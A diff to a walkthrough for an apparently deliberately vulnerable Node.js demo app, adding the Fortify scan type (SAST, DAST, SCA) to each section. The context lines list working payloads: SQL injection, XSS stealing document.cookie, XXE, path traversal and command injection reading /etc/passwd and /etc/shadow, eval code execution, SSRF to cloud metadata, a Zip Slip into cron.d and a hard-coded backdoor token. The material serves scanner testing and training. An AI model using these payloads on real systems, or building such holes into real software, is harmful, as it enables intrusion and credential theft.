@@ -15,7 +15,8 @@ npm install && npm run dev
 ## 1. SQL Injection (CWE-89)
 
 **Endpoint:** `GET /api/v3/users?keywords=<payload>`  
-**Auth:** ****** (get from POST /api/v3/site/sign-in)
+**Auth:** Bearer Token (get from `POST /api/v3/site/sign-in`)  
+**Fortify Tooling Detection:** SAST, DAST
 
 ```bash
 # Sign in first
@@ -37,10 +38,12 @@ curl -H "Authorization: ******" \
 
 ## 2. Reflected XSS (CWE-79)
 
-**Endpoint:** `GET /products?keywords=<script>alert(1)</script>`
+**Endpoint:** `GET /products?keywords=<script>alert(1)</script>`  
+**Fortify Tooling Detection:** SAST, DAST
 
 ```
 http://localhost:8888/products?keywords=<script>alert(document.cookie)</script>
+http://localhost:8888/products?raw=true&keywords=<script>alert(1)</script>
 http://localhost:8888/login?error=<script>alert(1)</script>
 ```
 
@@ -50,7 +53,8 @@ http://localhost:8888/login?error=<script>alert(1)</script>
 
 ## 3. Stored XSS (CWE-79)
 
-**Via API review creation:**
+**Via API review creation:**  
+**Fortify Tooling Detection:** SAST, DAST
 
 ```bash
 TOKEN=$(curl -s -X POST http://localhost:8888/api/v3/site/sign-in \
@@ -72,7 +76,8 @@ curl -X POST http://localhost:8888/api/v3/reviews \
 
 ## 4. XXE — XML External Entity Injection (CWE-611)
 
-**Endpoint:** `POST /user/upload-xml-file` (login as user1 first)
+**Endpoint:** `POST /user/upload-xml-file` (login as user1 first)  
+**Fortify Tooling Detection:** SAST, DAST
 
 Create file `/tmp/xxe.xml`:
 ```xml
@@ -94,7 +99,8 @@ Create file `/tmp/xxe.xml`:
 
 ## 5. Path Traversal (CWE-22)
 
-**Endpoint:** `GET /user/files/download/unverified?file=../../etc/passwd`
+**Endpoint:** `GET /user/files/download/unverified?file=../../etc/passwd`  
+**Fortify Tooling Detection:** SAST, DAST
 
 ```
 http://localhost:8888/user/files/download/unverified?file=../../../etc/passwd
@@ -106,7 +112,8 @@ http://localhost:8888/user/files/download/unverified?file=../../../etc/passwd
 
 ## 6. OS Command Injection (CWE-78)
 
-**Endpoint:** `POST /admin/command-shell` or `POST /user/command-shell`
+**Endpoint:** `POST /admin/command-shell` or `POST /user/command-shell`  
+**Fortify Tooling Detection:** SAST, DAST
 
 ```
 cmd=ls -la; cat /etc/passwd
@@ -120,7 +127,8 @@ cmd=ls /; cat /etc/shadow
 
 ## 7. Insecure Deserialization (CWE-502)
 
-**Endpoint:** `POST /user/import-settings`
+**Endpoint:** `POST /user/import-settings`  
+**Fortify Tooling Detection:** SAST, DAST
 
 ```bash
 # Generate payload (run once in Node.js):
@@ -145,7 +153,8 @@ curl -s -X POST http://localhost:8888/user/import-settings \
 
 ## 8. Log Injection (CWE-117)
 
-**Endpoint:** `POST /admin/log?val=<payload>`
+**Endpoint:** `POST /admin/log?val=<payload>`  
+**Fortify Tooling Detection:** SAST
 
 ```
 http://localhost:8888/admin/log?val=%0AWARNING%20Fake+admin+login+success+for+root
@@ -157,7 +166,8 @@ http://localhost:8888/admin/log?val=%0AWARNING%20Fake+admin+login+success+for+ro
 
 ## 9. Sensitive Data in Logs (CWE-532)
 
-**Step:** Attempt login and check logs.
+**Step:** Attempt login and check logs.  
+**Fortify Tooling Detection:** SAST
 
 ```bash
 curl -X POST http://localhost:8888/api/v3/site/sign-in \
@@ -172,7 +182,8 @@ cat ./logs/iwa.log | grep "password"
 
 ## 10. Broken Access Control / IDOR (CWE-306, CWE-639)
 
-**Endpoint:** `PUT /api/v3/users/:id` — **No authentication required!**
+**Endpoint:** `PUT /api/v3/users/:id` — **No authentication required!**  
+**Fortify Tooling Detection:** DAST
 
 ```bash
 # Get a user ID
@@ -194,7 +205,8 @@ curl -X PUT http://localhost:8888/api/v3/users/$USER_ID \
 
 ## 11. Prototype Pollution (CWE-1321)
 
-**Endpoint:** `POST /user/edit-profile` (logged in as user1)
+**Endpoint:** `POST /user/edit-profile` (logged in as user1)  
+**Fortify Tooling Detection:** SAST, DAST
 
 ```bash
 curl -X POST http://localhost:8888/user/edit-profile \
@@ -209,7 +221,8 @@ curl -X POST http://localhost:8888/user/edit-profile \
 
 ## 12. Admin Backdoor (CWE-798)
 
-**URL:** `http://localhost:8888/admin/backdoor?token=iwa-admin-backdoor-super-secret-token-cwe798`
+**URL:** `http://localhost:8888/admin/backdoor?token=iwa-admin-backdoor-super-secret-token-cwe798`  
+**Fortify Tooling Detection:** SAST, DAST
 
 **Expected:** Backdoor access granted without standard authentication.
 
@@ -217,7 +230,8 @@ curl -X POST http://localhost:8888/user/edit-profile \
 
 ## 13. Code Injection via eval (CWE-95)
 
-**Endpoint:** `POST /admin/diagnostics` — field `expr`
+**Endpoint:** `POST /admin/diagnostics` — field `expr`  
+**Fortify Tooling Detection:** SAST, DAST
 
 ```
 expr=require('child_process').execSync('id').toString()
@@ -230,7 +244,8 @@ expr=process.env
 
 ## 14. SSRF (CWE-918)
 
-**Endpoint:** `POST /admin/diagnostics` — field `url`
+**Endpoint:** `POST /admin/diagnostics` — field `url`  
+**Fortify Tooling Detection:** SAST, DAST
 
 ```
 url=http://169.254.169.254/latest/meta-data/
@@ -244,7 +259,8 @@ url=file:///etc/passwd
 
 ## 15. Zip Slip (CWE-22)
 
-**Endpoint:** `POST /admin/backup` — upload a crafted ZIP
+**Endpoint:** `POST /admin/backup` — upload a crafted ZIP  
+**Fortify Tooling Detection:** SAST, DAST
 
 ```bash
 # Create malicious ZIP
@@ -265,6 +281,8 @@ cd /tmp && zip malicious.zip ../../etc/cron.d/evil.txt
 http://localhost:8888/login?redirect=http://evil.example.com
 ```
 
+**Fortify Tooling Detection:** SAST, DAST
+
 After successful login, user is redirected to `http://evil.example.com`.
 
 ---
@@ -278,6 +296,8 @@ curl -H "Origin: https://evil.example.com" \
      http://localhost:8888/api/v3/users
 ```
 
+**Fortify Tooling Detection:** SAST, DAST
+
 **Expected:** `Access-Control-Allow-Origin: https://evil.example.com` in response.
 
 ---
@@ -288,11 +308,15 @@ curl -H "Origin: https://evil.example.com" \
 curl http://localhost:8888/api/v3/users/invalid-id-that-causes-error
 ```
 
+**Fortify Tooling Detection:** SAST, DAST
+
 **Expected:** Full stack trace and SQL error returned in JSON response.
 
 ---
 
 ## SCA / Vulnerable Dependencies
+
+**Fortify Tooling Detection:** SCA
 
 ```bash
 npm audit
